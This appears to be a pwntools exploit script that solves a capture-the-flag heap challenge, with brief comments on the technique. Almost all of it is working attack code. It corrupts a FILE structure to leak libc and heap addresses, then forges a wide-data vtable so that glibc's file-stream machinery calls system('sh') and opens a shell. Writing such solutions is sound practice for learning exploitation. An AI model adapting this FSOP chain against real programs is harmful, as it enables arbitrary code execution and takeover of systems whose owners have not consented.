#!/usr/bin/env python3

# ruff: noqa: F403, F405


from pwn import *
from pwnlib import gdb

elf = context.binary = ELF("./chall_patched", checksec=False)
libc: ELF = elf.libc  # type: ignore
binary_path = elf.path
cwd = str(Path.cwd())


gdb.binary = lambda: "gef-bata24"


def start(argv=[], *a, **kw):
    nc = "nc localhost 13337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(
                args=args_,
                env=env,
                gdbscript=gdbscript,
                api=True,
                # sysroot=cwd,
                sysroot=None,
            )
        return process(args_, env=env, *a, **kw)


env = {}

# when there is no need for custom env, this should be set to None
# for some reason when we pass empty dictionary to `gdb.debug`, `pwntools` would
# still launch `gdbserver` with `--wrapper env -i` flag which result in the first
# thing to be debugged is `bash` then `env` and finally our target binary
#
# https://github.com/Gallopsled/pwntools/blob/96d98cf192cf1e9bc5d6bbeff5311e8961e58439/pwnlib/gdb.py#L347
# should have checked `len(env_args) > 0` instead of `env is not None`

if len(env) == 0:
    env = None

gdbscript = """
# b *main+156
c
heapbase
"""

io = start()

payload = b"A" * 0x28 + p64(0x1E1) + p64(0xFBAD2488) + p64(elf.got["puts"])

io.sendlineafter(b"\nChoice: ", b"3")
io.sendlineafter(b"\nChoice: ", b"1")
io.sendafter(b"name: ", payload)
io.sendlineafter(b"\nChoice: ", b"3")
io.recvline()
libc_leak = u64(io.recv(6) + b"\x00\x00")
libc.address = libc_leak - libc.sym["puts"]
log.info(f"{libc.address=:#x}")


payload = b"A" * 0x28 + p64(0x1E1) + p64(0xFBAD2488) + p64(libc.address - 0x2908 + 1)
io.sendlineafter(b"\nChoice: ", b"1")
io.sendafter(b"name: ", payload)
io.sendlineafter(b"\nChoice: ", b"3")
io.recvline()
heap_base = u64(b"\x00" + io.recvline().strip().ljust(7, b"\x00"))
log.info(f"{heap_base=:#x}")

# https://d0ublew.github.io/notes/pwn/fsop/index.html#example-2
fake_wide_vtable = heap_base + 0x16A0
payload = b""
# doing this ensures both fp->_wide_data->_IO_write_base and
# fp->_wide_data->_IO_buf_base is set to NULL
payload = payload.ljust(0x68, b"\x00")
payload += p64(
    libc.sym["system"]
)  # _wide_vtable+0x68, which is also fp->_wide_data->_codecvt
payload = payload.ljust(0xE0, b"\x00")
payload += p64(fake_wide_vtable)  # fp->_wide_data->_wide_vtable
io.sendlineafter(b"\nChoice: ", b"2")
io.sendafter(b"piece: ", payload)

libc_stdout = libc.sym["_IO_2_1_stdout_"]

payload = b"A" * 0x208 + p64(0x1E1) + p64(0xFBAD2C84) + p64(heap_base + 0x16A0) * 4
payload += p64(libc_stdout) + p64(libc_stdout + 0x1000)
io.sendlineafter(b"\nChoice: ", b"1")
io.sendlineafter(b"name: ", payload)


fs = FileStructure()
fs.flags = u32(b"  sh")
fs.fileno = 1
fs._lock = libc.sym["_IO_stdfile_1_lock"]
fs._wide_data = fake_wide_vtable
# 0x38 is the function offset inside vtable
# 0x18 is __overflow offset for _IO_jump_t
fs.vtable = libc.sym["_IO_wfile_jumps"] - 0x38 + 0x18
payload = bytes(fs)

io.sendlineafter(b"\nChoice: ", b"2")
io.sendafter(b"piece: ", payload)

io.interactive()
